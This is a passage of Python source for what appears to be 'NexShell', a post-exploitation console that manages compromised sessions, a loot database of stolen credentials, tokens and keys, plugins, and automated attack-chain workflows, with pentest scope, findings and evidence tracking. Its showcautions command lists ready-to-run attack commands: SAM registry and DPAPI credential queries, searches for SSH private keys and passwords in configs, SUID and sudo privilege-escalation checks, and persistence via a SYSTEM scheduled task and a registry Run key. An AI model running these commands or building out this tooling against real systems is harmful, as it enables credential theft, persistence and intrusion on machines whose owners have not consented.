            print(tbl)
        else:
            parts = line.split(' ', 1)
            key   = parts[0]
            # Special: SET LHOST auto | SET LHOST <ip>
            if key.upper() == 'LHOST':
                if len(parts) == 1 or parts[1].strip().lower() == 'auto':
                    options.lhost_all = _get_all_local_ips()
                    options.lhost     = options.lhost_all[0] if options.lhost_all else _get_lhost()
                    logger.info(f"LHOST auto-detected: {paint(options.lhost).lime}")
                else:
                    options.lhost = parts[1].strip()
                    logger.info(f"LHOST set to: {paint(options.lhost).lime}")
                return
            try:
                if len(parts) == 1:
                    print(paint(repr(getattr(options, key))).yellow)
                else:
                    from ast import literal_eval
                    setattr(options, key, literal_eval(parts[1]))
                    logger.info(f"'{key}' = {paint(repr(getattr(options, key))).yellow}")
            except AttributeError: cmdlogger.error("No such option")
            except Exception as e: cmdlogger.error(f"{type(e).__name__}: {e}")

    def do_history(self, line):
        """— Show command history"""
        try:
            import readline as rl
            for i in range(1, rl.get_current_history_length()+1):
                print(f"  {i:>4}  {rl.get_history_item(i)}")
        except Exception:
            cmdlogger.warning("readline not available")

    def do_reset(self, line):
        """— Reset local terminal"""
        if shutil.which("reset"): os.system("reset")
        else: cmdlogger.error("'reset' not found")

    def do_clear(self, line):
        """— Clear terminal screen (also: Ctrl+L)"""
        # Use ANSI escape + os.system for cross-platform compat
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()

    def do_cls(self, line):
        """— Clear terminal screen"""
        self.do_clear(line)

    def do_showcautions(self, line):
        """— Show OS-aware exploitation suggestions for current session"""
        s = core.sessions.get(self.sid)
        if not s:
            cmdlogger.warning('No active session. Use: use [ID]')
            return
        os_type = getattr(s, 'OS', 'Linux')
        user     = getattr(s, 'user', '?')
        is_root  = getattr(s, 'is_root', False)
        priv_icon = paint('◆ ROOT').red if is_root else paint('◇ USER').yellow

        print(f"\n  {paint('NexShell').purple_BRIGHT} — {paint('Exploitation Suggestions').lime}")
        print(f"  {'─'*60}")
        print(f"  Target OS   : {paint(os_type).cyan}")
        print(f"  Current User: {paint(user).yellow}  {priv_icon}")
        print()

        if os_type == 'Windows':
            sections = [
                ("🔍 Enumeration", [
                    ("plugins run auto-enum-windows",    "Full system enumeration (users, groups, OS, creds...)"),
                    ("plugins run cred-hunter",          "Hunt for credentials (files, env vars, registry...)"),
                    ("plugins run privesc-scanner",      "Scan for local privilege escalation vectors"),
                    ("plugins run network-scout",        "Discover internal network, shares, open ports"),
                    ("plugins run persistence-check",    "Check for existing persistence mechanisms"),
                ]),
                ("⬆️  Privilege Escalation", [
                    ("run privesc",                       "Run built-in Windows PrivEsc advisor"),
                    ("exec whoami /priv",                 "Check current token privileges"),
                    ("exec whoami /groups",               "Check group memberships"),
                    ("exec systeminfo",                   "Get full system info (patch level, KB)"),
                    ("exec reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated", "Check AlwaysInstallElevated"),
                ]),
                ("🔑 Credential Access", [
                    ("exec cmdkey /list",                 "List stored Windows credentials (cmdkey)"),
                    ("exec net user",                     "List all local users"),
                    ("exec net localgroup administrators","List local admins"),
                    ("exec reg query HKLM\\\\SAM",        "Query SAM registry (may need SYSTEM)"),
                    ("exec dir /b %USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Credentials", "List DPAPI credential files"),
                ]),
                ("🔗 Lateral Movement", [
                    ("plugins run lateral-mover",         "Scan for SMB, WMI, WinRM lateral paths"),
                    ("exec net view /all",                "Discover network shares"),
                    ("exec arp -a",                       "Show ARP table (discover hosts)"),
                ]),
                ("📌 Persistence", [
                    ("exec schtasks /create /sc onlogon /tn nexshell /tr calc.exe /ru SYSTEM", "Add scheduled task"),
                    ("exec reg add HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v nexshell /t REG_SZ /d cmd.exe", "Add registry run key"),
                ]),
            ]
        else:  # Linux / macOS / BSD
            sections = [
                ("🔍 Enumeration", [
                    ("plugins run auto-enum-linux",      "Full Linux post-exploitation enumeration"),
                    ("plugins run cred-hunter",          "Hunt for passwords in files, env, configs"),
                    ("plugins run network-scout",        "Discover internal network, ports, services"),
                    ("plugins run persistence-check",    "Check for backdoors, cron jobs, systemd units"),
                    ("run quickenum",                    "Run built-in quick Linux enum script (in-memory)"),
                ]),
                ("⬆️  Privilege Escalation", [
                    ("run privesc",                       "Run PrivEsc advisor script"),
                    ("exec sudo -l",                      "Check sudo rights"),
                    ("exec find / -perm -4000 -type f 2>/dev/null | head -20", "List SUID binaries"),
                    ("exec getcap -r / 2>/dev/null",      "List capabilities"),
                    ("exec cat /etc/passwd | grep -v nologin", "Readable users"),
                    ("exec cat /etc/crontab",             "Check cron jobs"),
                ]),
                ("🔑 Credential Access", [
                    ("run credharvest",                   "Run CredHarvest script (env, configs, keys)"),
                    ("exec cat ~/.bash_history",          "Read bash history"),
                    ("exec find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null", "Find SSH private keys"),
                    ("exec find / -name '*.conf' 2>/dev/null | xargs grep -l 'password' 2>/dev/null | head -10", "Search config files for passwords"),
                ]),
                ("🔗 Lateral Movement", [
                    ("plugins run lateral-mover",         "Scan for NFS, SSH lateral paths"),
                    ("exec cat /etc/hosts",               "Read hosts file"),
                    ("exec arp -a",                       "ARP table (discover network hosts)"),
                    ("exec ss -tlnp",                     "List listening ports and services"),
                ]),
                ("🐳 Container Escape", [
                    ("run container",                     "Check for container escape vectors"),
                    ("exec ls -la /var/run/docker.sock",  "Check Docker socket access"),
                    ("exec cat /proc/1/cgroup",           "Detect if inside container"),
                ]),
            ]

        for section_title, tips in sections:
            print(f"  {paint(section_title).orange}")
            for cmd, desc in tips:
                col_cmd  = str(paint(cmd.ljust(52)).lime)
                col_desc = str(paint(f'# {desc}').darkgrey)
                print(f"    {paint('>').teal} {col_cmd}  {col_desc}")
            print()
        print(f"  {paint('Tip').yellow}: Type any command above exactly as shown, e.g: {paint('exec whoami /priv').lime}")
        print()

    # ══════════════════════════════════════════════════════════════════════════
    # v2 COMMANDS
    # ══════════════════════════════════════════════════════════════════════════

    # ── db ────────────────────────────────────────────────────────────────────
    def do_db(self, line):
        """[search|export|wipe|sessions|history] — Database management"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'help'
        get_db = _try_import('db', 'get_db')

        if sub == 'help' or not sub:
            print("\n  db search [keyword]        — Search all loot"
                  "\n  db search creds            — Show only credentials"
                  "\n  db export <file.md|json>   — Export full report"
                  "\n  db sessions [--dead]       — List sessions from DB"
                  "\n  db history <session_id>    — Command history for session"
                  "\n  db wipe                    — ⚠️  Delete all DB data"
                  "\n  db stats                   — Quick DB statistics\n")
            return

        if not get_db:
            cmdlogger.error("Database module not loaded"); return
        db = get_db()

        if sub == 'search':
            keyword  = ' '.join(args[1:]) if len(args) > 1 else None
            category = None
            CATEGORIES = {'creds': 'credentials', 'keys': 'private_keys',
                          'tokens': 'api_tokens', 'hashes': 'hashes',
                          'network': 'network', 'jwt': 'jwt'}
            if keyword and keyword.lower() in CATEGORIES:
                category = CATEGORIES[keyword.lower()]; keyword = None
            rows = db.search_loot(category=category, keyword=keyword)
            if not rows:
                cmdlogger.warning("No loot found."); return
            print(f"\n  Found {len(rows)} loot item(s):\n")
            for r in rows[:50]:
                preview = str(r.get('data', ''))[:80].replace('\n', ' ')
                print(f"  [{r.get('category','?'):<18}] "
                      f"{r.get('host','?'):<16} {preview}")
            print()

        elif sub == 'export':
            path = args[1] if len(args) > 1 else 'nexshell_report.md'
            if path.endswith('.json'):
                db.export_json(path)
            else:
                db.export_markdown(path)
            logger.info(f"Report exported → {paint(path).lime}")

        elif sub == 'sessions':
            status = 'dead' if '--dead' in args else None
            rows   = db.list_sessions(status=status)
            if not rows:
                cmdlogger.warning("No sessions in DB."); return
            print()
            for s in rows:
                root = paint(" ROOT").red if s.get('is_root') else ""
                print(f"  [{s['id']:>3}] {s['host']:<18} {s.get('os','?'):<10} "
                      f"{s.get('user','?'):<12}{root}  [{s.get('status','?')}]")
            print()

        elif sub == 'history':
            sid = int(args[1]) if len(args) > 1 and args[1].isdigit() else None
            if sid is None:
                cmdlogger.warning("Usage: db history <session_id>"); return
            rows = db.get_history(sid, limit=50)
            if not rows:
                cmdlogger.warning(f"No history for session {sid}."); return
            print(f"\n  Command history — Session {sid}:\n")
            for r in rows:
                ts = str(r.get('ts', ''))[:16]
                print(f"  {ts}  {r.get('command','')}")
            print()

        elif sub == 'stats':
            stats = db.stats()
            print(f"\n  Sessions (active/total) : {stats.get('sessions_active')}/{stats.get('sessions_total')}")
            print(f"  Loot (total/creds)      : {stats.get('loot_total')}/{stats.get('loot_creds')}")
            print(f"  Listeners active        : {stats.get('listeners_active')}\n")

        elif sub == 'wipe':
            if ask("⚠️  Delete ALL data from database? (yes/N): ") == 'yes':
                db.wipe(confirm=True)
                logger.info("Database wiped.")
            else:
                print("  Cancelled.")

        else:
            cmdlogger.warning(f"Unknown db subcommand: {sub}")

    # ── operation ─────────────────────────────────────────────────────────────
    def do_operation(self, line):
        """[new|open|archive|status|scope|objective] — Manage operations"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'status'
        ops  = _try_import('operations', 'ops')
        if not ops:
            cmdlogger.error("Operations module not loaded"); return

        if sub == 'new':
            name = ' '.join(args[1:]) if len(args) > 1 else None
            if not name:
                cmdlogger.warning("Usage: operation new <name>"); return
            try:
                op = ops.new(name)
                ops.open(name)
                logger.info(f"Operation created and opened: {paint(name).lime}")
            except ValueError as e:
                cmdlogger.error(str(e))

        elif sub == 'open':
            name = ' '.join(args[1:]) if len(args) > 1 else None
            if not name:
                available = [o['name'] for o in ops.list_all()]
                cmdlogger.warning(f"Usage: operation open <name>  — Available: {available}")
                return
            try:
                ops.open(name)
                logger.info(f"Operation opened: {paint(name).lime}")
            except FileNotFoundError as e:
                cmdlogger.error(str(e))

        elif sub == 'archive':
            name = args[1] if len(args) > 1 else None
            if ops.archive(name):
                logger.info("Operation archived.")
            else:
                cmdlogger.warning("No active operation to archive.")

        elif sub == 'status':
            print(ops.status_summary())

        elif sub == 'list':
            all_ops = ops.list_all()
            if not all_ops:
                print("  No operations found."); return
            print()
            for o in all_ops:
                active = " ← active" if ops.active and ops.active.name == o['name'] else ""
                print(f"  [{o.get('status','?'):<10}] {o['name']}{active}")
            print()

        elif sub == 'scope':
            if len(args) < 3:
                cmdlogger.warning("Usage: operation scope add <ip_or_cidr>"); return
            if args[1] == 'add':
                target = args[2]
                if '.' in target:
                    ops.add_scope_ip(target)
                else:
                    ops.add_scope_domain(target)
                logger.info(f"Scope added: {paint(target).lime}")

        elif sub == 'objective':
            if len(args) < 3 or args[1] != 'add':
                cmdlogger.warning("Usage: operation objective add <text>"); return
            text = ' '.join(args[2:])
            ops.add_objective(text)
            logger.info(f"Objective added: {paint(text).lime}")

        else:
            cmdlogger.warning(f"Unknown subcommand: {sub}")

    # ── host ──────────────────────────────────────────────────────────────────
    def do_host(self, line):
        """[add|list|show|tag|risk|note] — Asset inventory management"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        inv  = _try_import('inventory', 'inventory')
        if not inv:
            cmdlogger.error("Inventory module not loaded"); return

        if sub == 'add':
            if len(args) < 2:
                cmdlogger.warning("Usage: host add <ip> [hostname] [os]"); return
            ip       = args[1]
            hostname = args[2] if len(args) > 2 else ""
            os_type  = args[3] if len(args) > 3 else "Unknown"
            h = inv.add(ip=ip, hostname=hostname, os=os_type)
            logger.info(f"Host added: {paint(ip).lime} ({hostname})")
            # Auto-link active session
            if self.sid:
                inv.link_session(ip, self.sid)

        elif sub == 'list':
            print(inv.summary())

        elif sub == 'show':
            ip = args[1] if len(args) > 1 else None
            if not ip:
                cmdlogger.warning("Usage: host show <ip>"); return
            h = inv.get(ip)
            if not h:
                cmdlogger.warning(f"Host {ip} not in inventory."); return
            print(f"\n  IP       : {h.ip}")
            print(f"  Hostname : {h.hostname or '—'}")
            print(f"  OS       : {h.os}")
            print(f"  Domain   : {h.domain or '—'}")
            print(f"  Risk     : {h.risk}")
            print(f"  Tags     : {', '.join(h.tags) or '—'}")
            print(f"  Sessions : {h.session_ids or '—'}")
            if h.notes:
                print(f"  Notes:")
                for n in h.notes[-5:]:
                    print(f"    {n}")
            print()

        elif sub == 'tag':
            if len(args) < 3:
                cmdlogger.warning("Usage: host tag <ip> <label>"); return
            inv.tag(args[1], args[2])
            logger.info(f"Host {args[1]} tagged: {paint(args[2]).lime}")

        elif sub == 'risk':
            if len(args) < 3:
                cmdlogger.warning("Usage: host risk <ip> <low|medium|high|critical>"); return
            inv.set_risk(args[1], args[2])
            logger.info(f"Host {args[1]} risk set to: {paint(args[2]).yellow}")

        elif sub == 'note':
            if len(args) < 3:
                cmdlogger.warning("Usage: host note <ip> <text>"); return
            ip   = args[1]
            text = ' '.join(args[2:])
            inv.add_note(ip, text)
            logger.info(f"Note added to {ip}")

        else:
            cmdlogger.warning(f"Unknown host subcommand: {sub}")

    # ── graph ─────────────────────────────────────────────────────────────────
    def do_graph(self, line):
        """— Show attack graph of discovered hosts"""
        inv = _try_import('inventory', 'inventory')
        if not inv:
            cmdlogger.error("Inventory module not loaded"); return
        print(inv.attack_graph_ascii())

    # ── finding ───────────────────────────────────────────────────────────────
    def do_finding(self, line):
        """[add|list] — Manage security findings"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        findings_mgr = _try_import('inventory', 'findings')
        if not findings_mgr:
            cmdlogger.error("Findings module not loaded"); return

        if sub == 'list':
            print(findings_mgr.summary())
            fs = findings_mgr.list_by_severity()
            for f in fs[:20]:
                print(f"  {f.severity_icon} [{f.severity:<8}] {f.title} — {f.host or '—'}")
            if fs:
                print()

        elif sub == 'add':
            title = ' '.join(args[1:]) if len(args) > 1 else None
            if not title:
                cmdlogger.warning("Usage: finding add <title>"); return
            host = getattr(core.sessions.get(self.sid), 'host', '') if self.sid else ''
            sid  = self.sid or 0
            severity = ask("Severity [info/low/medium/high/critical]: ").strip() or 'info'
            rec      = ask("Recommendation (optional): ").strip()
            mitre_id = ask("MITRE ID (e.g. T1078, optional): ").strip()
            f = findings_mgr.add(title=title, severity=severity,
                                  host=host, session_id=sid,
                                  recommendation=rec, mitre_id=mitre_id)
            logger.info(f"Finding added [{f.severity}]: {paint(title).lime}")

        else:
            cmdlogger.warning(f"Unknown finding subcommand: {sub}")

    # ── evidence ──────────────────────────────────────────────────────────────
    def do_evidence(self, line):
        """[add|list|export] — Evidence collection with chain of custody"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        ev   = _try_import('evidence', 'collector')
        if not ev:
            cmdlogger.error("Evidence module not loaded"); return

        host = getattr(core.sessions.get(self.sid), 'host', '') if self.sid else ''
        sid  = self.sid or 0

        if sub == 'list':
            print(ev.list_all())

        elif sub == 'add':
            ev_type = args[1] if len(args) > 1 else 'text'
            content = ' '.join(args[2:]) if len(args) > 2 else ask("Content: ")
            if ev_type == 'command':
                note    = ask("Note (optional): ").strip()
                output  = ask("Command output (paste, press Enter twice): ").strip()
                item = ev.add_command(content, output, host=host, session_id=sid, note=note)
            elif ev_type == 'file':
                item = ev.add_file(content, host=host, session_id=sid)
            else:
                item = ev.add_text(content, ev_type=ev_type, host=host, session_id=sid)
            logger.info(f"Evidence added [{ev_type}]: SHA256={item.sha256[:16]}…")

        elif sub == 'export':
            out = args[1] if len(args) > 1 else 'evidence_bundle.zip'
            path = ev.export_bundle(out)
            logger.info(f"Evidence bundle exported → {paint(path).lime}")

        else:
            cmdlogger.warning(f"Unknown evidence subcommand: {sub}")

    # ── mitre ─────────────────────────────────────────────────────────────────
    def do_mitre(self, line):
        """[show T1078|search <kw>|list|tag <id>] — MITRE ATT&CK lookup"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        m    = _try_import('knowledge', 'mitre')
        if not m:
            cmdlogger.error("Knowledge module not loaded"); return

        if sub == 'list':
            print(m.list_all())

        elif sub == 'show':
            tid = args[1].upper() if len(args) > 1 else None
            if not tid:
                cmdlogger.warning("Usage: mitre show <T-ID>"); return
            print(m.format_technique(tid))

        elif sub == 'search':
            kw = ' '.join(args[1:]) if len(args) > 1 else None
            if not kw:
                cmdlogger.warning("Usage: mitre search <keyword>"); return
            results = m.search(kw)
            if not results:
                cmdlogger.warning(f"No techniques found for: {kw}"); return
            print()
            for t in results:
                print(f"  {t['id']:<12} {t['name']:<45} {t['tactic'][:30]}")
            print()

        elif sub == 'tag':
            tid = args[1].upper() if len(args) > 1 else None
            if not tid or not self.sid:
                cmdlogger.warning("Usage: mitre tag <T-ID>  (requires active session)"); return
            if m.tag_session(self.sid, tid):
                logger.info(f"Session [{self.sid}] tagged with MITRE {paint(tid).lime}")
            else:
                cmdlogger.warning(f"Unknown technique: {tid}")

        else:
            cmdlogger.warning(f"Unknown mitre subcommand: {sub}")

    # ── playbook ──────────────────────────────────────────────────────────────
    def do_playbook(self, line):
        """[show <name>|list] — Attack playbooks"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        pb   = _try_import('knowledge', 'playbooks')
        if not pb:
            cmdlogger.error("Knowledge module not loaded"); return

        if sub == 'list':
            all_pb = pb.list_all()
            print()
            for p in all_pb:
                print(f"  {p['id']:<25} {p['name']}")
            print()

        elif sub == 'show':
            name = args[1] if len(args) > 1 else None
            if not name:
                cmdlogger.warning("Usage: playbook show <name>"); return
            print(pb.format(name))

        else:
            # Treat the full line as playbook name
            print(pb.format(line.strip()))

    # ── plugins ───────────────────────────────────────────────────────────────
    def do_plugins(self, line):
        """[list|reload|run <name>|<name>] — Plugin management"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        reg  = _try_import('core.plugin', 'registry')
        if not reg:
            cmdlogger.error("Plugin module not loaded"); return

        def _normalize(n):
            """Accept both hyphens and underscores, lowercase."""
            return n.replace('_', '-').lower()

        def _find_plugin(name):
            """Find plugin by name, tolerating _ vs - and case differences."""
            norm = _normalize(name)
            # Direct match first
            if name in reg:
                return name
            # Normalized match
            for p in reg.list_all():
                if _normalize(p['name']) == norm:
                    return p['name']
            return None

        if sub == 'list' or not sub:
            plugins = reg.list_all()
            if not plugins:
                print("  No plugins loaded. Place .py files in plugins/ directory."); return
            print()
            # Group by category
            from collections import defaultdict
            by_cat = defaultdict(list)
            for p in sorted(plugins, key=lambda x: x['name']):
                by_cat[p['category']].append(p)
            for cat, plist in sorted(by_cat.items()):
                print(f"  \033[1;33m{cat.upper()}\033[0m")
                for p in plist:
                    plat_color = '\033[92m' if p['platform'] == 'linux' else '\033[94m' if p['platform'] == 'windows' else '\033[90m'
                    print(f"    {p['name']:<30} {plat_color}[{p['platform']:<7}]\033[0m  {p['description'][:45]}")
            print()

        elif sub == 'reload':
            loaded = reg.reload()
            logger.info(f"Plugins reloaded: {len(loaded)} loaded")

        elif sub == 'run':
            name = args[1] if len(args) > 1 else None
            if not name:
                cmdlogger.warning("Usage: plugins run <name>"); return
            if not self._require_session(): return
            real_name = _find_plugin(name)
            if not real_name:
                # Suggest similar plugins
                norm = _normalize(name)
                suggestions = [p['name'] for p in reg.list_all()
                               if norm in _normalize(p['name']) or _normalize(p['name']) in norm]
                msg = f"Plugin '{name}' not found."
                if suggestions:
                    msg += f" Did you mean: {', '.join(suggestions[:3])}?"
                else:
                    msg += " Use: plugins list"
                cmdlogger.error(msg); return
            try:
                session = core.sessions.get(self.sid)
                logger.info(f"Running plugin '{real_name}' on session [{self.sid}]...")
                result  = reg.run(real_name, session, args[2:])
                if result:
                    print(result)
            except Exception as e:
                cmdlogger.error(f"Plugin error: {e}")

        else:
            # Try running directly: 'plugins auto-enum-linux' or 'plugins auto_enum_linux'
            real_name = _find_plugin(sub)
            if real_name:
                if not self._require_session(): return
                try:
                    session = core.sessions.get(self.sid)
                    logger.info(f"Running plugin '{real_name}' on session [{self.sid}]...")
                    result = reg.run(real_name, session, args[1:])
                    if result:
                        print(result)
                except Exception as e:
                    cmdlogger.error(f"Plugin error: {e}")
            else:
                norm = _normalize(sub)
                suggestions = [p['name'] for p in reg.list_all()
                               if norm in _normalize(p['name']) or _normalize(p['name']) in norm]
                msg = f"Unknown plugins subcommand or plugin: '{sub}'."
                if suggestions:
                    msg += f" Did you mean: {', '.join(suggestions[:3])}?"
                cmdlogger.warning(msg)


    # ── task ──────────────────────────────────────────────────────────────────
    def do_task(self, line):
        """[list|cancel <id>] — Background task management"""
        line = line or ''
        args  = line.split()
        sub   = args[0] if args else 'list'
        sched = _try_import('core.scheduler', 'scheduler')
        if not sched:
            cmdlogger.error("Scheduler module not loaded"); return

        if sub == 'list' or not sub:
            status = sched.status()
            sections = [
                ('Running',   status['running'],   '🔄'),
                ('Pending',   status['pending'],   '⏳'),
                ('Completed', status['completed'], '✅'),
                ('Failed',    status['failed'],    '❌'),
            ]
            print()
            for label, tasks, icon in sections:
                if tasks:
                    print(f"  {icon} {label}:")
                    for t in tasks:
                        ts = (t.get('started') or t.get('created') or '')[:16]
                        print(f"     [{t['id']}] {t['label']:<40} {ts}")
            print()

        elif sub == 'cancel':
            tid = args[1] if len(args) > 1 else None
            if not tid:
                cmdlogger.warning("Usage: task cancel <id>"); return
            if sched.cancel(tid):
                logger.info(f"Task {tid} cancelled.")
            else:
                cmdlogger.warning(f"Task {tid} not found or already running.")

        else:
            cmdlogger.warning(f"Unknown task subcommand: {sub}")

    # ── workflow ───────────────────────────────────────────────────────────────
    def do_workflow(self, line):
        """[list|run <name>|status <id>] — Automated attack chain workflows"""
        line = line or ''
        args  = line.split()
        sub   = args[0] if args else 'list'
        wfm   = _try_import('core.workflow', 'wf_manager')
        if not wfm:
            cmdlogger.error("Workflow module not loaded"); return

        if sub == 'list' or not sub:
            wfs = wfm.list_all()
            print()
            for wf in wfs:
                print(f"  {wf['name']:<25} {wf['steps']:>3} steps  {wf['description']}")
            print()

        elif sub == 'run':
            name = args[1] if len(args) > 1 else None
            if not name:
                cmdlogger.warning("Usage: workflow run <name>"); return
            if not self._require_session(): return
            session = core.sessions.get(self.sid)
            wf = wfm.run(name, session, background=True)
            if wf:
                logger.info(f"Workflow [{wf.id}] '{name}' launched in background. "
                             f"Check status: workflow status {wf.id}")
            else:
                cmdlogger.error(f"Workflow '{name}' not found. Use: workflow list")

        elif sub == 'status':
            wf_id = args[1] if len(args) > 1 else None
            if not wf_id:
                # Show all recent
                history = wfm.get_history()
                if not history:
                    print("  No workflows run yet."); return
                print()
                for wf in history[-10:]:
                    print(f"  [{wf['id']}] {wf['name']:<25} {wf['status']}")
                print()
            else:
                wf = wfm.get_by_id(wf_id)
                if not wf:
                    cmdlogger.warning(f"Workflow {wf_id} not found."); return
                print(wf.status_report())

        else:
            cmdlogger.warning(f"Unknown workflow subcommand: {sub}")

    # ── checklist ─────────────────────────────────────────────────────────────
    def do_checklist(self, line):
        """[show|complete <key>|reset <key>|template <name>] — Engagement checklist"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'show'
        ops  = _try_import('operations', 'ops')
        if not ops:
            cmdlogger.error("Operations module not loaded"); return

        if sub == 'show':
            cl = getattr(ops.active, '_checklist', None) if ops.active else None
            if not cl:
                try:
                    from operations.checklist import Checklist
                    cl = Checklist.from_template('pentest')
                except Exception as e:
                    cmdlogger.error(f"Checklist not available: {e}"); return
            print(cl.render())

        elif sub == 'template':
            name = args[1] if len(args) > 1 else 'pentest'
            try:
                from operations.checklist import Checklist
                cl = Checklist.from_template(name)
                if ops.active:
                    ops.active._checklist = cl
                    ops._save()
                logger.info(f"Checklist template loaded: {paint(name).lime}")
                print(cl.render())
            except Exception as e:
                cmdlogger.error(str(e))

        elif sub == 'complete':
            key = args[1] if len(args) > 1 else None
            if not key:
                cmdlogger.warning("Usage: checklist complete <key>"); return
            cl = getattr(ops.active, '_checklist', None) if ops.active else None
            if not cl:
                cmdlogger.warning("No active checklist. Use: checklist template pentest"); return
            note = ' '.join(args[2:]) if len(args) > 2 else ''
            if cl.complete(key, note):
                logger.info(f"Checklist item completed: {paint(key).lime}")
                prog = cl.progress()
                print(f"  Progress: {prog['completed']}/{prog['total']} ({prog['pct']}%)")
            else:
                cmdlogger.warning(f"Key not found: {key}")

        elif sub == 'reset':
            key = args[1] if len(args) > 1 else None
            if not key:
                cmdlogger.warning("Usage: checklist reset <key>"); return
            cl = getattr(ops.active, '_checklist', None) if ops.active else None
            if cl and cl.uncomplete(key):
                logger.info(f"Checklist item reset: {key}")
            else:
                cmdlogger.warning(f"Key not found: {key}")

        else:
            cmdlogger.warning(f"Unknown checklist subcommand: {sub}")

    # ── timeline ───────────────────────────────────────────────────────────────
    def do_timeline(self, line):
        """[show|add <event>|export] — Engagement timeline"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'show'
        tl_m = _try_import('operations.timeline', 'Timeline')
        ops  = _try_import('operations', 'ops')
        if not tl_m or not ops:
            cmdlogger.error("Timeline module not loaded"); return

        # Get or create timeline on active operation
        tl = getattr(ops.active, '_timeline', None) if ops.active else None
        if tl is None:
            tl = tl_m()
            if ops.active:
                ops.active._timeline = tl

        if sub == 'show':
            print(tl.render())

        elif sub == 'add':
            if len(args) < 2:
                cmdlogger.warning("Usage: timeline add <event title>"); return
            title = ' '.join(args[1:])
            ev_type = 'info'
            # Detect type from keywords
            kw_map = {
                ('shell', 'access', 'foothold', 'initial'): 'access',
                ('root', 'admin', 'escalat'):               'escalation',
                ('lateral', 'pivot', 'smb', 'pass'):        'lateral',
                ('persist',):                               'persistence',
                ('exfil',):                                 'exfil',
                ('evidence',):                              'evidence',
                ('finding', 'vuln', 'cve'):                 'finding',
                ('recon', 'scan', 'enum'):                  'recon',
                ('comprom', 'pwned', 'owned'):              'compromise',
            }
            title_lower = title.lower()
            for kws, t in kw_map.items():
                if any(k in title_lower for k in kws):
                    ev_type = t; break
            ev = tl.add(title, ev_type=ev_type, session_id=self.sid or 0)
            logger.info(f"Timeline event added [{ev_type}]: {paint(title).lime}")

        elif sub == 'export':
            path = args[1] if len(args) > 1 else 'timeline.md'
            Path(path).write_text(tl.export_markdown(), encoding='utf-8')
            logger.info(f"Timeline exported → {paint(path).lime}")

        else:
            cmdlogger.warning(f"Unknown timeline subcommand: {sub}")

    # ── scope ──────────────────────────────────────────────────────────────────
    def do_scope(self, line):
        """[show|add <ip/cidr>|domain <name>|exclude <ip>|check <ip>] — Scope management"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'show'
        ops  = _try_import('operations', 'ops')
        if not ops:
            cmdlogger.error("Operations module not loaded"); return

        # Get scope manager from active operation
        scope_m = _try_import('operations.scope', 'ScopeManager')
        scope   = getattr(ops.active, '_scope', None) if ops.active else None
        if scope is None and scope_m:
            scope = scope_m()
            if ops.active:
                ops.active._scope = scope

        if not scope:
            cmdlogger.error("No active operation. Use: operation new <name>"); return

        if sub == 'show':
            print(scope.summary())

        elif sub == 'add':
            target = args[1] if len(args) > 1 else None
            if not target:
                cmdlogger.warning("Usage: scope add <ip/cidr>"); return
            try:
                scope.add_ip(target)
                ops.add_scope_ip(target)
                logger.info(f"Scope IP added: {paint(target).lime}")
            except ValueError as e:
                cmdlogger.error(str(e))

        elif sub == 'domain':
            domain = args[1] if len(args) > 1 else None
            if not domain:
                cmdlogger.warning("Usage: scope domain <name>"); return
            scope.add_domain(domain)
            ops.add_scope_domain(domain)
            logger.info(f"Scope domain added: {paint(domain).lime}")

        elif sub == 'exclude':
            target = args[1] if len(args) > 1 else None
            if not target:
                cmdlogger.warning("Usage: scope exclude <ip/cidr>"); return
            try:
                scope.add_exclusion(target)
                logger.info(f"Exclusion added: {paint(target).yellow}")
            except ValueError as e:
                cmdlogger.error(str(e))

        elif sub == 'check':
            target = args[1] if len(args) > 1 else None
            if not target:
                cmdlogger.warning("Usage: scope check <ip>"); return
            result = scope.check(target)
            color_map = {'IN_SCOPE': paint(result).lime,
                         'EXCLUDED': paint(result).yellow,
                         'OUT_OF_SCOPE': paint(result).red}
            colored = color_map.get(result, result)
            print(f"\n  {target} → {colored}\n")

        else:
            cmdlogger.warning(f"Unknown scope subcommand: {sub}")

    # ── svc ────────────────────────────────────────────────────────────────────
    def do_svc(self, line):
        """[add <ip> <port> [svc] [ver]|list|show <ip>|interesting] — Service inventory"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        svcs = _try_import('inventory.services', 'services')
        if not svcs:
            cmdlogger.error("Services module not loaded"); return

        if sub == 'list':
            print(svcs.summary())

        elif sub == 'show':
            ip = args[1] if len(args) > 1 else None
            if not ip:
                cmdlogger.warning("Usage: svc show <ip>"); return
            print(svcs.show(ip))

        elif sub == 'add':
            if len(args) < 3:
                cmdlogger.warning("Usage: svc add <ip> <port> [service] [version]"); return
            ip      = args[1]
            port    = int(args[2]) if args[2].isdigit() else 0
            service = args[3] if len(args) > 3 else ''
            version = ' '.join(args[4:]) if len(args) > 4 else ''
            s = svcs.add(ip, port=port, service=service, version=version)
            logger.info(f"Service added: {paint(ip).lime}:{port} ({s.service})")

        elif sub == 'nmap':
            ip = args[1] if len(args) > 1 else None
            if not ip or not self.sid:
                cmdlogger.warning("Usage: svc nmap <ip>  (requires active session)"); return
            logger.info(f"Importing nmap results for {ip}…")
            # Run nmap via session
            session = core.sessions.get(self.sid)
            if session:
                output = ''
                if hasattr(session, 'exec'):
                    output = session.exec(f"nmap -sV -p- --open {ip} 2>/dev/null") or ''
                svcs.add_from_nmap(ip, output)
                logger.info(f"Nmap services imported for {ip}")

        elif sub == 'interesting':
            interesting = svcs.interesting()
            if not interesting:
                print("  No high-interest services found."); return
            print(f"\n  High-Interest Services ({len(interesting)}):\n")
            for s in interesting:
